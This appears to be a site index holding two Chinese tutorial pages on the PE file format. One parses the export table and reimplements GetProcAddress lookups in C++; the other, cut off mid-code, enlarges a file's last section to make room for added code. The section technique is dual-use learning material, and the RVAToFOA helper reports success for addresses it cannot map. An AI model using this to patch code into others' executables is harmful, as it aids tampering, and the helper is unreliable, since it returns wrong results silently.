表项里存的是函数地址，是个RVA值。可以通过这个地址找过去，将对应的字节贴到OD里看反汇编，来知道这个函数地址是对应上面写的Plus、Sub、Mul、Div中的哪一个（这里写出对应写的哪个函数是为了后面查导出表时方便观察学习）。 以序号0为例来体现这个过程，序号0表项存的是00001014h，查过去，看到字节码是个jmp，也能接着查。jmp+相对偏移，相对偏移是17h，正数，说明实际的函数地址比这个jmp指令高17个字节。目前jmp指令FOA是1014h，从1019h(jmp指令下一条指令的地址)后跳17个字节，就来到真正的函数地址。 看到了55 8B（函数栈帧开头的套路），随便复制一段字节码，假设是蓝颜色方框里的内容 随便用OD打开一个程序，然后修改反汇编区中的二进制，将上面蓝颜色方框的内容贴进去，看对应的汇编指令是什么。这个例子看出是Add函数 其他三个函数地址都用这样的方法得知对应之前写dll时的哪个函数。对上面的表格再加一列，得到下面的表格： 序号 表项的内容 假装知道函数地址对应上面写的哪个函数 0 00001014h Plus函数 1 0000100Ah Mul函数 2 00000000h 3 0000100Fh Sub函数 4 00001005h Div函数 导出函数名称表 AddressOfNames字段的值是0002DF50h，这个值是导出函数名称表的起始地址，这个地址表每一项大小是4字节，表项的数量是NumberOfFunctions个。表项是一个指向函数名称字符串的地址。 序号 表项的内容 表项地址指向的字符串 0 0002DF6Ch Div 1 0002DF70h Mul 2 0002DF74h Plus 可以看到这个表是按字符串从小到大排了序的。 导出函数序号表 AddressOfNameOrdinals字段的值是0002DF5Ch，这个值是导出函数序号表的起始地址，这个地址表每一项大小是2字节，导出函数名称表有几项，这个表就有几项。 序号 表项的内容 0 5 1 1 2 0 查表过程 调用dll中导出函数的办法是用GetProcAddress获取dll中导出函数的函数地址，然后通过这个函数地址来调用函数 1234FARPROC GetProcAddress( HMODULE hModule, // DLL模块句柄 LPCSTR lpProcName // 传函数名或序号); 在本文的上面，我们获取到了如下三张表的信息，现在我们来讲述用GetProcAddress获取导出函数地址的过程（就是GetProcAddress函数的内部实现）。 以函数名来寻找 当GetProcAddress第二个参数传的是函数名，查找导出函数地址的过程如下： 在导出函数名称表查这个函数名在这张表中对应的数组索引号，假设记为name_index 以name_index作为数组索引，去导出函数序号表查对应项，得到序号ordinal 以ordinal作为数组索引，去导出函数地址表查对应项，得到函数地址 例 1GetProcAddress(hModule, &quot;Div&quot;); Div在导出函数名称表中是第0项 导出函数名称表第0项内容是5 导出函数地址表第5项内容是0x00001005 于是GetProcAddress(hModule, “Div”)返回0x00001005 以序号来寻找 当GetProcAddress第二个参数传的是序号，查找导出函数地址的过程如下： 用序号减去Base（起始序号）得到一个值 使用步骤1得到的这个值作为数组索引，在导出函数地址表查对应项，得到函数地址 例 1GetProcAddress(hModule, 17); 17-Base（12）=5 导出函数地址表第5项内容是0x00001005 于是GetProcAddress(hModule, 17)返回0x00001005 或让导出函数地址表的索引+上Base，那么导出函数地址表项数和序号对应如下： 第0项，对应序号12 第1项，对应序号13 第2项，对应序号14 第3项，对应序号15 第4项，对应序号16 第5项，对应序号17 然后拿传的序号17去导出函数地址表查序号17表项内容是多少，一样的。 小结 以函数名查函数地址，要用到名称表，序号表，地址表 以导出序号查函数地址，只需要地址表 为什么要有序号表 以上面用函数名Div查看函数地址的过程为例 如果Div还有一个别名，假设为rDiv1（前面的r为了字符串排序加的，没其他意思），那么名称表会多一项名称表[3]=&quot;rDiv1&quot;字符串的地址。 当使用Div和rDiv1名称去名称表查序号，查Div和rDiv1得到的数组索引号肯定是不一样的，Div是0，rDiv1是3。 Div和rDiv1实际上都是同一个函数地址，所以在名称表和地址表之间再加一个序号表作为中转，用于用于连接名称表和地址表。 小结：序号表存在的意义为了应对有函数别名的情况，序号表用于连接名称表和地址表。 但经过实验发现，存在别名的情况下，序号表对从名称表得到的索引还是“映射”成不同的值，地址表也又存了一份别名的函数地址。而不会让序号表里多个序号指向地址表同一个函数地址，具体可见这篇文章。 本来用序号表可以优化成： 结果是这个样子：算上别名2次，加上Plus本名，它将Plus函数函数地址在地址表存了3遍！ 小声bb：有别名，地址表就多存一份。那都没必要用序号表了，去名称表查得到索引，直接拿索引去地址表查就行了。 编程实现 辅助函数 导出表指针获取RVA转FOA获取FileBuffer中导出表指针123456789101112131415161718PIMAGE_EXPORT_DIRECTORY PEManipulator::GetExportDirectoryPointer()&#123; DWORD dwExportDirectoryRVA = m_OptionalPeHdr-&gt;DataDirectory[0].VirtualAddress; if (dwExportDirectoryRVA == 0) &#123; printf(&quot;[-] Error: DataDirectory[0].VirtualAddress is Empty &quot;); return nullptr; &#125; DWORD dwExportDirectoryFOA = 0; if (!RVAToFOA(dwExportDirectoryRVA, dwExportDirectoryFOA)) &#123; printf(&quot;[-] Error: Failed to convert RVA to FOA &quot;); return nullptr; &#125; return (PIMAGE_EXPORT_DIRECTORY)((DWORD)m_lpFileBuffer + dwExportDirectoryFOA);&#125;RVA转FOA123456789101112131415161718192021222324252627282930BOOL PEManipulator::RVAToFOA(DWORD dwRVA, OUT DWORD&amp; dwFOA)&#123; dwFOA = 0; // 初始化 dwFOA，防止warning if (dwRVA &lt; 0) //参数校验 &#123; return FALSE; &#125; //RVA在SizeOfHeaders以内 或 FileAlignment==SectionAlignment 时FOA=RVA if (dwRVA &lt;= m_OptionalPeHdr-&gt;SizeOfHeaders || m_OptionalPeHdr-&gt;FileAlignment == m_OptionalPeHdr-&gt;SectionAlignment) &#123; dwFOA = dwRVA; return TRUE; &#125; //在节表中 for (int i = 0; i &lt; m_PeHdr-&gt;NumberOfSections; i++) &#123; if (m_SecHdr[i].VirtualAddress &lt;= dwRVA &amp;&amp; dwRVA &lt; m_SecHdr[i].VirtualAddress + m_SecHdr[i].Misc.VirtualSize) &#123; //节.PointerToRawData + 差值 //差值=RVA-节.VirtualAddress dwFOA = m_SecHdr[i].PointerToRawData + (dwRVA - m_SecHdr[i].VirtualAddress); return TRUE; &#125; &#125; return TRUE;&#125; 打印导出表 打印导出表字段打印名称表打印序号表打印地址表1234567891011121314151617181920212223242526VOID PEManipulator::PrintExportTable()&#123; auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; return; &#125; printf(&quot; Characteristics: 0x%08X &quot;, pExportDirectory-&gt;Characteristics); printf(&quot; TimeDateStamp: 0x%08X &quot;, pExportDirectory-&gt;TimeDateStamp); printf(&quot; MajorVersion: 0x%04X &quot;, pExportDirectory-&gt;MajorVersion); printf(&quot; MinorVersion: 0x%04X &quot;, pExportDirectory-&gt;MinorVersion); DWORD dwNameFOA = 0; if (RVAToFOA(pExportDirectory-&gt;Name, dwNameFOA) == FALSE) &#123; return; &#125; PCHAR cName = (PCHAR)((DWORD)m_lpFileBuffer + dwNameFOA); printf(&quot; Name: 0x%08X (\\&quot;%s\\&quot;) &quot;, pExportDirectory-&gt;Name, cName); printf(&quot; Base: 0x%08X &quot;, pExportDirectory-&gt;Base); printf(&quot; NumberOfFunctions: 0x%08X &quot;, pExportDirectory-&gt;NumberOfFunctions); printf(&quot; NumberOfNames: 0x%08X &quot;, pExportDirectory-&gt;NumberOfNames); printf(&quot; AddressOfFunctions: 0x%08X &quot;, pExportDirectory-&gt;AddressOfFunctions); printf(&quot; AddressOfNames: 0x%08X &quot;, pExportDirectory-&gt;AddressOfNames); printf(&quot; AddressOfNameOrdinals: 0x%08X &quot;, pExportDirectory-&gt;AddressOfNameOrdinals);&#125;123456789101112131415161718192021222324252627282930313233VOID PEManipulator::PrintNameTable()&#123; //获取导出表指针 auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; return; &#125; //获取函数名称表指针 DWORD dwNameTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfNames, dwNameTableFOA)) &#123; return; &#125; auto pNameTable = PDWORD((DWORD)m_lpFileBuffer + dwNameTableFOA); //打印函数名称表内容 printf(&quot; Index Name RVA Name FOA Name &quot;); printf(&quot; ----- ---------- ---------- ---- &quot;); for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123; DWORD dwNameRVA = pNameTable[i]; DWORD dwNameFOA = 0; if (!RVAToFOA(dwNameRVA, dwNameFOA)) &#123; return; &#125; PCHAR Name = (PCHAR)((DWORD)m_lpFileBuffer + dwNameFOA); printf(&quot; %02lu 0x%08X 0x%08X %s &quot;, i, dwNameRVA, dwNameFOA, Name); &#125;&#125;12345678910111213141516171819202122232425VOID PEManipulator::PrintOrdinalTable()&#123; //获取导出表指针 auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; return; &#125; //获取导出函数序号表指针 DWORD dwOrdinalTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfNameOrdinals, dwOrdinalTableFOA)) &#123; return; &#125; auto pOrdinalTable = PWORD((DWORD)m_lpFileBuffer + dwOrdinalTableFOA); //打印函数序号表内容 printf(&quot; Index Ordinal &quot;); printf(&quot; ----- ------- &quot;); for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123; printf(&quot; %02lu %04d &quot;, i, pOrdinalTable[i]); &#125;&#125;1234567891011121314151617181920212223242526272829303132VOID PEManipulator::PrintFunctionTable()&#123; //获取导出表指针 auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; return; &#125; //获取函数地址表指针 DWORD dwFunctionTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfFunctions, dwFunctionTableFOA)) &#123; return; &#125; auto pFunctionTable = PDWORD((DWORD)m_lpFileBuffer + dwFunctionTableFOA); //打印函数地址表内容 printf(&quot; Index Function RVA Function FOA &quot;); printf(&quot; ----- ------------- ------------- &quot;); for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfFunctions; i++) &#123; DWORD dwFunctionAddressRVA = pFunctionTable[i]; DWORD dwFunctionAddressFOA = 0; if (!RVAToFOA(dwFunctionAddressRVA, dwFunctionAddressFOA)) &#123; return; &#125; printf(&quot; %02lu 0x%08X 0x%08X &quot;, i, dwFunctionAddressRVA, dwFunctionAddressFOA); &#125;&#125; 测试函数 1234567891011121314151617181920212223242526272829303132333435363738394041//测试打印导出表int TestPrintExportTable()&#123; //用户输入版 //CHAR cFilePath[MAX_PATH]; //printf(&quot;Enter the path of the PE file: &quot;); //fflush(stdout); // 确保输出立即显示 //if (!fgets(cFilePath, MAX_PATH, stdin)) //&#123; // printf(&quot;[!] Error reading input. &quot;); // return 1; //&#125; //size_t len = strlen(cFilePath);// 去除末尾的换行符 //if (len &gt; 0 &amp;&amp; cFilePath[len - 1] == &#x27; &#x27;) //&#123; // cFilePath[len - 1] = &#x27;\\0&#x27;; //&#125; //PEManipulator PEFile(cFilePath); //写死的，方便测试用 PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyDll_VC.dll&quot;); //VC的，文件对齐和内存对齐都是1000h //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VS的，文件对齐200h，内存对齐是1000h if (!PEFile.MapPEFile()) &#123; return 1; &#125; if (!PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.PrintExportTable(); PEFile.PrintNameTable(); PEFile.PrintOrdinalTable(); PEFile.PrintFunctionTable(); return 0;&#125; 文件对齐≠内存对齐文件对齐=内存对齐测试的dll源码还是本文前面的源码，在VC下编译，文件对齐≠内存对齐 测试的dll源码还是本文前面的源码，在VS下32位编译，文件对齐和内存对齐都是1000h 查函数地址过程 作业题是： GetFunctionAddrByName(FileBuffer指针，函数名指针) GetFunctionAddrByOrdinals(FileBuffer指针，函数名导出序号) 因为俺是用C++写的，FileBuffer是成员变量，所以俺实现的上面两个函数没这个参数，不重要，重点是如何通过函数名or序号来查函数地址的过程，Buffer不同只是PE中相关指针获取的变动。 另外，GetFunctionAddrByName和GetFunctionAddrByOrdinals和下面GetProcAddress的区别就是： FileBuffer是未拉伸的文件映像内存，所以当遇到RVA的值时，需要转为FOA hModule是dll加载进进程空间后的基址，也就是前面学习的ImageBuffer，即拉伸后的文件映像内存 知道GetFunctionAddrByName和GetFunctionAddrByOrdinals怎么写了，合并成GetProcAddress还需要判断第二个参数传入的是函数名或序号。 1234FARPROC GetProcAddress( HMODULE hModule, // DLL模块句柄 LPCSTR lpProcName // 传函数名或序号); 以序号查询 GetFunctionAddressByOrdinals序号查询函数实现测试函数12345678910111213141516171819202122232425262728293031323334DWORD PEManipulator::GetFunctionAddressByOrdinals(DWORD dwFunctionOrdinal)&#123; //获取导出表指针 auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; return 0; &#125; //获取函数地址表指针 DWORD dwFunctionTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfFunctions, dwFunctionTableFOA)) &#123; return 0; &#125; auto pFunctionTable = PDWORD((DWORD)m_lpFileBuffer + dwFunctionTableFOA); //减去Base获得真实序号 并 对输入的序号做范围检查 DWORD dwRealOrdinalIndex = dwFunctionOrdinal - pExportDirectory-&gt;Base; if (dwRealOrdinalIndex &lt; 0 || dwRealOrdinalIndex &gt;= pExportDirectory-&gt;NumberOfFunctions) &#123; printf(&quot;[-] Error: Function ordinal %d is out of range. &quot;, dwFunctionOrdinal); return 0; &#125; // Fetch the function address by the real ordinal index. DWORD dwfunctionRVA = pFunctionTable[dwRealOrdinalIndex]; if (dwfunctionRVA == 0) &#123; printf(&quot;[-] Error: Function RVA is null, indicating a non-existent function at this ordinal. &quot;); return 0; &#125; return dwfunctionRVA;&#125;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970//测试通过序号获取导出函数地址int TestGetFunctionAddressByOrdinals()&#123; //用户输入版 //CHAR cFilePath[MAX_PATH]; //printf(&quot;Enter the path of the PE file: &quot;); //fflush(stdout); // 确保输出立即显示 //if (!fgets(cFilePath, MAX_PATH, stdin)) //&#123; // printf(&quot;[!] Error reading input. &quot;); // return 1; //&#125; //size_t len = strlen(cFilePath);// 去除末尾的换行符 //if (len &gt; 0 &amp;&amp; cFilePath[len - 1] == &#x27; &#x27;) //&#123; // cFilePath[len - 1] = &#x27;\\0&#x27;; //&#125; //PEManipulator PEFile(cFilePath); //写死的，方便测试用 //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //是PE文件 PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyDll_VC.dll&quot;); //VC的 if (!PEFile.MapPEFile()) &#123; return 1; &#125; if (!PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.PrintExportTable(); PEFile.PrintFunctionTable(); char input[10]; // 增大缓冲区以防止溢出 while (true) &#123; printf(&quot; Enter the function ordinal to lookup (Enter &#x27;q&#x27; to exit): &quot;); if (scanf(&quot;%9s&quot;, input) != 1) // 使用%s来读取字符串，限制读取的字符数 &#123; printf(&quot;[!] Invalid input. Please enter a valid number or &#x27;q&#x27; to exit. &quot;); // 清除错误的输入 while (getchar() != &#x27; &#x27;); continue; &#125; // 提供退出条件 if (input[0] == &#x27;q&#x27; &amp;&amp; input[1] == &#x27;\\0&#x27;) // 确保只有一个字符&#x27;q&#x27; &#123; break; &#125; DWORD dwOrdinal; if (sscanf(input, &quot;%lu&quot;, &amp;dwOrdinal) == 1) // 尝试将输入转换为数字 &#123; DWORD dwFunctionAddress = PEFile.GetFunctionAddressByOrdinals(dwOrdinal); if (dwFunctionAddress != 0) &#123; printf(&quot;Function address for ordinal %lu is: 0x%08X &quot;, dwOrdinal, dwFunctionAddress); &#125; &#125; else &#123; printf(&quot;[!] Invalid ordinal. Please enter a valid number or &#x27;q&#x27; to exit. &quot;); &#125; &#125; return 0;&#125; 以函数名查询 GetFunctionAddressByName以函数名查询的函数实现测试函数1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162DWORD PEManipulator::GetFunctionAddressByName(PCHAR pFunName)&#123; //获取导出表指针 auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; return 0; &#125; //获取函数名称表指针 DWORD dwNameTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfNames, dwNameTableFOA)) &#123; return 0; &#125; auto pNameTable = PDWORD((DWORD)m_lpFileBuffer + dwNameTableFOA); //获取导出函数序号表指针 DWORD dwOrdinalTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfNameOrdinals, dwOrdinalTableFOA)) &#123; return 0; &#125; auto pOrdinalTable = PWORD((DWORD)m_lpFileBuffer + dwOrdinalTableFOA); //获取函数地址表指针 DWORD dwFunctionTableFOA = 0; if (!RVAToFOA(pExportDirectory-&gt;AddressOfFunctions, dwFunctionTableFOA)) &#123; return 0; &#125; auto pFunctionTable = PDWORD((DWORD)m_lpFileBuffer + dwFunctionTableFOA); //通过函数名称获取函数地址 for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; i++) &#123; DWORD dwNameRVA = pNameTable[i]; DWORD dwNameFOA = 0; if (!RVAToFOA(dwNameRVA, dwNameFOA)) &#123; return 0; &#125; PCHAR pName = (PCHAR)((DWORD)m_lpFileBuffer + dwNameFOA); if (strcmp(pName, pFunName) == 0) &#123; //从序号表获取函数序号表的索引 DWORD dwFunTableIndex = pOrdinalTable[i]; //通过序号表获取的索引在函数地址表获取函数地址 DWORD dwFunctionRVA = pFunctionTable[dwFunTableIndex]; if (dwFunctionRVA == 0) &#123; printf(&quot;[-] Error: Function RVA is null, indicating a non-existent function at this index. &quot;); return 0; &#125; return dwFunctionRVA; &#125; &#125; printf(&quot;[-] Error: No function named &#x27;%s&#x27; found in the export table. &quot;, pFunName); return 0;&#125; 这里提一下，用函数名查名称表得到索引号，拿着这个索引号去地址表查表，一般情况下不太可能查到地址为0（除非被别人改过这个dll的内容，正常写dll的话，没法出现名称表里的名字，最后对上地址表里一个为0的函数地址吧）。但是代码中还是对查地址表时得到的函数地址做了检验 12345if (dwFunctionRVA == 0)&#123; printf(&quot;[-] Error: Function RVA is null, indicating a non-existent function at this index. &quot;); return 0;&#125;12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849//测试通过序号获取导出函数地址int TestGetFunctionAddressByName()&#123; //写死的，方便测试用 PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyDll_VC.dll&quot;); //VC的 //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VS的 if (!PEFile.MapPEFile()) &#123; return 1; &#125; if (!PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.PrintExportTable(); PEFile.PrintNameTable(); PEFile.PrintOrdinalTable(); PEFile.PrintFunctionTable(); char functionName[256]; while (true) &#123; printf(&quot; Enter function name (&#x27;q&#x27; to quit): &quot;); if (fgets(functionName, sizeof(functionName), stdin) == nullptr) break; // Remove newline character, if present size_t len = strlen(functionName); if (len &gt; 0 &amp;&amp; functionName[len - 1] == &#x27; &#x27;) functionName[len - 1] = &#x27;\\0&#x27;; if (strcmp(functionName, &quot;q&quot;) == 0) break; DWORD functionAddress = PEFile.GetFunctionAddressByName(functionName); if (functionAddress != 0) &#123; printf(&quot;Function &#x27;%s&#x27; address: 0x%08X &quot;, functionName, functionAddress); &#125; else &#123; printf(&quot;Function &#x27;%s&#x27; not found or has no address. &quot;, functionName); &#125; &#125; return 0;&#125; 用LoarPE检查下，通过函数名Div，Mul，Plus找到的3个导出函数地址是正确的 扩展：LordPE合并导出表三张子表 LordPE看导出表时它会将三张子表的信息合并然后输出： 它的做法是： 去函数地址表遍历 表项的函数地址为0，跳过 表项的函数地址不为0，则用函数地址的这个索引号去序号表找内容为这个值的索引号是多少 如果在序号表找得到，说明这个函数地址有名字。拿着匹配到的索引号接着去名称表得到函数名字 如果如果在序号表找不到，说明这个函数地址没有名字，是按序号导出的。Funciton Name那一列就打印“-”表示没名字。真实序号就是+Base得到的 例：有函数名的例子 函数地址表第0项，函数地址非0。 拿着索引号0去序号表看能否找到表项为0的。有，序号表第2项的值为0，说明这个函数地址有名字。 那么接着拿索引号2去名称表查表，查到函数名称为Plus 例：无函数名的例子 函数地址表第4项，函数地址非0。 拿着索引号4去序号表看能否找到表项为4的。没有，说明这个函数地址是序号导出的，真实序号是索引号4加上Base 代码实现 函数实现测试函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758VOID PEManipulator::PrintMergedExportTable()&#123; // 获取导出表指针 auto pExportDirectory = GetExportDirectoryPointer(); if (!pExportDirectory) &#123; printf(&quot;Failed to get export directory pointer. &quot;); return; &#125; // 获取函数地址表、函数名称表和函数序号表的指针 DWORD dwFunctionTableFOA, dwNameTableFOA, dwOrdinalTableFOA; if (!RVAToFOA(pExportDirectory-&gt;AddressOfFunctions, dwFunctionTableFOA) || !RVAToFOA(pExportDirectory-&gt;AddressOfNames, dwNameTableFOA) || !RVAToFOA(pExportDirectory-&gt;AddressOfNameOrdinals, dwOrdinalTableFOA)) &#123; printf(&quot;Failed to convert RVAs to FOAs. &quot;); return; &#125; auto pFunctionTable = PDWORD((DWORD)m_lpFileBuffer + dwFunctionTableFOA); auto pNameTable = PDWORD((DWORD)m_lpFileBuffer + dwNameTableFOA); auto pOrdinalTable = PWORD((DWORD)m_lpFileBuffer + dwOrdinalTableFOA); printf(&quot;Real Index\\tOrdinal\\tFunction RVA\\tFunction FOA\\tFunction Name &quot;); printf(&quot;----------\\t-------\\t------------\\t------------\\t------------- &quot;); for (DWORD i = 0; i &lt; pExportDirectory-&gt;NumberOfFunctions; i++) &#123; DWORD dwFunctionRVA = pFunctionTable[i]; if (dwFunctionRVA == 0) // Skip empty entries continue; DWORD dwFunctionFOA; if (!RVAToFOA(dwFunctionRVA, dwFunctionFOA)) continue; // Initialize function name as not found const char* cpFunctionName = &quot;-&quot;; DWORD dwRealIndex = i + pExportDirectory-&gt;Base; // Calculate real index // Try to find a matching ordinal in the ordinal table to get the name index for (DWORD j = 0; j &lt; pExportDirectory-&gt;NumberOfNames; j++) &#123; if (pOrdinalTable[j] == i) &#123; DWORD dwNameRVA = pNameTable[j]; DWORD dwNameFOA; if (RVAToFOA(dwNameRVA, dwNameFOA)) &#123; cpFunctionName = (char*)((DWORD)m_lpFileBuffer + dwNameFOA); break; &#125; &#125; &#125; printf(&quot;%d\\t\\t%u\\t0x%08X\\t0x%08X\\t%s &quot;, dwRealIndex, i, dwFunctionRVA, dwFunctionFOA, cpFunctionName); &#125;&#125;12345678910111213141516171819//测试打印导出表合并后的三张子表，像LordPE那样int TestPrintMergedExportTable()&#123; //写死的，方便测试用 PEManipulator PEFile(&quot;E:\\\\temp\\\\Export Table\\\\MyDll_VC.dll&quot;); //VC的 //PEManipulator PEFile(&quot;D:\\\\005_Codefield\\\\VS2019\\\\MyTestDll\\\\Debug\\\\MyTestDll.dll&quot;); //VS的 if (!PEFile.MapPEFile()) &#123; return 1; &#125; if (!PEFile.ValidateAndExtractPEPointers()) &#123; return 1; &#125; PEFile.PrintMergedExportTable(); return 0;&#125;"},{"title":"扩大节","path":"/wiki/PE/扩大节.html","content":"前言 之前讲过了如何在空白区添加代码，但如果要添加的代码比较多，空白区不够用，怎么办。其中一个办法是：扩大节。 扩大节 从操作上讲，扩大最后一个节比较简单。如果不是，则需要将准备扩大的节后面的节都要移动。假设一个PE文件有3个节，如果我们选择扩大第1个节，就需要将第2和第3个节的节数据往后移，就会比较麻烦。扩大最后一个节会比较简单，这里以扩大最后一个节为例，比较简便的步骤如下： 在最后一个节的末尾添加要增加的空间，假设大小记为S（这个是内存对齐倍数的值） 在节表中修改如下字段： 最后一个节的SizeOfRawData和VirtualSize都修改为N N=max{节.SizeOfRawData，节.VirtualSize}的值按内存对齐后 + S 修改SizeOfImage=原SizeOfImage + S 注意是否需要这个节增加可执行属性 再简便点，最后一个节的SizeOfRawData和VirtualSize，SizeOfImage都直接加上0x1000 更严谨的计算方法： 在最后一个节的末尾添加要增加的空间，假设大小记为S（任意数值） 在节表中修改如下字段： 最后一个节的节.SizeOfRawData修改为原SizeOfRawData+S按文件对齐后的大小 最后一个节的节.VirtualSize修改为原VirtualSize+S按内存对齐后的大小 修改SizeOfImage=原SizeOfImage+S按内存对齐后的大小 注意是否需要这个节增加可执行属性 编程实现 草稿：为了和新增节的流程统一，扩大节这里也是在ImageBuffer上改完最后一个节的信息，然后在弄到NewImageBuffer，再-&gt;NewFileBuffer，再存盘 0413:改了，ExtendTheLastSection函数里就分配NewImageBuffer返回出来 获取ImageBuffer上相关的PE头指针 1234567891011121314PEHeaders ImagePEHeaders&#123; nullptr &#125;;if (!ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders))&#123; printf(&quot; [!] (In %s) Extract the PE Pointers of NewImageBuffer failed &quot;, __func__); return nullptr;&#125;printf(&quot; [+] Extract the PE Pointers of NewImageBuffer successfully. &quot;);if (!ImagePEHeaders.DosHdr || !ImagePEHeaders.NtHdr || // 检查所有PEHeaders成员是否有效，避免编译器警告 !ImagePEHeaders.PeHdr || !ImagePEHeaders.OptionalPeHdr || !ImagePEHeaders.SecHdr)&#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return nullptr;&#125; 计算NewImageBuffer大小，申请该大小的空间并填充为0，然后将ImageBuffer拷贝到NewImageBuffer 1234567//根据新的SizeOfImage来为NewImageBuffer申请内存大小DWORD dwNewImageBufferSize = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage + AlignUp(dwExtendSize, ImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment); // 申请新空间放到NewImageBufferLPVOID lpNewImageBuffer = new BYTE[dwNewImageBufferSize](); //since C++11 ,it&#x27;s okprintf(&quot;[+] new for NewImageBuffer successfully. &quot;);memcpy(lpNewImageBuffer, m_lpImageBuffer, ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage); 获取NewImageBuffer中相关的PE头指针，更新节表中的字段 1234567891011121314151617181920//获取NewImageBuffer区的新的PE头指针PEHeaders NewImagePEHeaders&#123; nullptr &#125;;if (!ExtractPEPointersFromBuffer(lpNewImageBuffer, NewImagePEHeaders))&#123; printf(&quot; [!] (In %s) Extract the PE Pointers of NewImageBuffer failed &quot;, __func__); return nullptr;&#125;printf(&quot; [+] Extract the PE Pointers of NewImageBuffer successfully. &quot;);if (!NewImagePEHeaders.DosHdr || !NewImagePEHeaders.NtHdr || // 检查所有PEHeaders成员是否有效，避免编译器警告 !NewImagePEHeaders.PeHdr || !NewImagePEHeaders.OptionalPeHdr || !NewImagePEHeaders.SecHdr)&#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return nullptr;&#125;//更新节表信息PIMAGE_SECTION_HEADER pSecHdrToLastSection = NewImagePEHeaders.SecHdr + (NewImagePEHeaders.PeHdr-&gt;NumberOfSections - 1);//最后一个节表pSecHdrToLastSection-&gt;SizeOfRawData += AlignUp(dwExtendSize, NewImagePEHeaders.OptionalPeHdr-&gt;FileAlignment);pSecHdrToLastSection-&gt;Misc.VirtualSize += AlignUp(dwExtendSize, NewImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment);//pSecHdrToLastSection-&gt;Characteristics //根据需要修改属性 更新SizeOfImage字段 1NewImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage += AlignUp(dwExtendSize, NewImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment); 注：AlignUp函数 1234567//VOID ImageBufferToNewImageBuffer();// This function aligns a given size up // to the nearest multiple of the alignment value.DWORD AlignUp(DWORD dwSize, DWORD dwAlignment) &#123;\treturn (dwSize + dwAlignment - 1) &amp; ~(dwAlignment - 1);&#125; 完整代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152LPVOID PEManipulator::ExtendTheLastSection(DWORD dwExtendSize)&#123; PEHeaders ImagePEHeaders&#123; nullptr &#125;; if (!ExtractPEPointersFromBuffer(m_lpImageBuffer, ImagePEHeaders)) &#123; printf(&quot; [!] (In %s) Extract the PE Pointers of NewImageBuffer failed &quot;, __func__); return nullptr; &#125; printf(&quot; [+] Extract the PE Pointers of NewImageBuffer successfully. &quot;); if (!ImagePEHeaders.DosHdr || !ImagePEHeaders.NtHdr || // 检查所有PEHeaders成员是否有效，避免编译器警告 !ImagePEHeaders.PeHdr || !ImagePEHeaders.OptionalPeHdr || !ImagePEHeaders.SecHdr) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return nullptr; &#125; //现在的节表字段还是原来的，弄到NewImageBuffer //根据新的SizeOfImage来为NewImageBuffer申请内存大小 DWORD dwNewImageBufferSize = ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage + AlignUp(dwExtendSize, ImagePEHeaders.OptionalPeHdr-&gt;SectionAlignment); // 申请新空间放到NewImageBuffer LPVOID lpNewImageBuffer = new BYTE[dwNewImageBufferSize](); //since C++11 ,it&#x27;s ok printf(&quot;[+] new for NewImageBuffer successfully. &quot;); memcpy(lpNewImageBuffer, m_lpImageBuffer, ImagePEHeaders.OptionalPeHdr-&gt;SizeOfImage); //获取NewImageBuffer区的新的PE头指针 PEHeaders NewImagePEHeaders&#123; nullptr &#125;; if (!ExtractPEPointersFromBuffer(lpNewImageBuffer, NewImagePEHeaders)) &#123; printf(&quot; [!] (In %s) Extract the PE Pointers of NewImageBuffer failed &quot;, __func__); return nullptr; &#125; printf(&quot; [+] Extract the PE Pointers of NewImageBuffer successfully. &quot;); if (!NewImagePEHeaders.DosHdr || !NewImagePEHeaders.NtHdr || // 检查所有PEHeaders成员是否有效，避免编译器警告 !NewImagePEHeaders.PeHdr || !NewImagePEHeaders.OptionalPeHdr || !NewImagePEHeaders.SecHdr) &#123; printf(&quot; [!] One or more PE Header pointers are invalid 